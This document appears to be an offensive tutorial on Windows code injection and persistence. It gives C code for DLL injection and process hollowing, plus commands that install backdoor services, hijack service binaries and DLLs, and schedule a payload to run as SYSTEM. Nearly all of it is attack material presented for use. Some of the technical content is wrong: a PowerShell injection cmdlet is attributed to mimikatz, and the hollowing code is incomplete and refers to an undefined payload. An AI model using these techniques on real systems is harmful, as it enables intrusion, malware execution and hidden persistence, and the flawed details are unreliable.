## DLL Injection Techniques

DLL injection is a method of executing malicious code by forcing a legitimate process to load an attacker-controlled DLL. This technique is commonly used for persistence, privilege escalation, and stealthy execution.

##### Classic DLL Injection

This involves injecting a DLL into a running process using `LoadLibrary` or `CreateRemoteThread`.

```c
#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));
    if (!hProcess) {
        printf("Failed to open process\n");
        return 1;
    }

    void* pDllPath = VirtualAllocEx(hProcess, NULL, strlen(argv[2]) + 1, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProcess, pDllPath, argv[2], strlen(argv[2]) + 1, NULL);
    
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pDllPath, 0, NULL);
    if (!hThread) {
        printf("Failed to create remote thread\n");
        return 1;
    }

    CloseHandle(hProcess);
    CloseHandle(hThread);
    return 0;
}
```

This code injects a specified DLL into a target process by writing the DLL path into the process's memory and executing `LoadLibraryA`.

##### Reflective DLL Injection

Reflective DLL injection allows loading a DLL directly into memory without writing it to disk. This method avoids detection by antivirus software.

A common tool for reflective DLL injection is `mimikatz`:

```powershell
Invoke-ReflectivePEInjection -PEPath C:\payload.dll -ProcessID 1234
```

##### Process Hollowing

Process hollowing is a technique where a legitimate process is launched in a suspended state, and its memory is replaced with malicious code.

```c
#include <windows.h>

int main() {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcess("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    void* pRemoteMemory = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, pRemoteMemory, payload, payloadSize, NULL);
    
    ResumeThread(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}
```

This creates a suspended `svchost.exe` process, replaces its memory with a malicious payload, and resumes execution.

#### Malicious Services

Windows services provide a powerful way to establish persistence by registering a backdoor service that starts at boot.

##### Creating a Malicious Service

```powershell
sc create BackdoorService binPath= "C:\Windows\System32\cmd.exe /c C:\payload.exe" start= auto
sc start BackdoorService
```

This registers a service that executes `payload.exe` on startup.

##### Modifying an Existing Service

If a writable service is found, its binary path can be modified to execute a backdoor.

```powershell
sc config VulnerableService binPath= "C:\malicious.exe"
sc start VulnerableService
```

##### DLL Hijacking

Many Windows services load DLLs from insecure directories. Replacing a DLL with a malicious version can grant execution with elevated privileges.

Steps:

1. Identify a DLL loaded by a service from an unprotected path:
    
    ```powershell
    listdlls -accepteula | findstr "C:\Program Files\VulnerableApp\"
    ```
    
1. Replace the DLL with a malicious one:
    
    ```powershell
    move C:\backdoor.dll C:\Program Files\VulnerableApp\legit.dll
    ```
    

##### Scheduled Task Service Execution

A service can be configured to execute a malicious task periodically.

```powershell
schtasks /create /tn "WinPersistence" /tr "C:\malicious.exe" /sc onlogon /ru SYSTEM
```

This ensures execution every time a user logs in.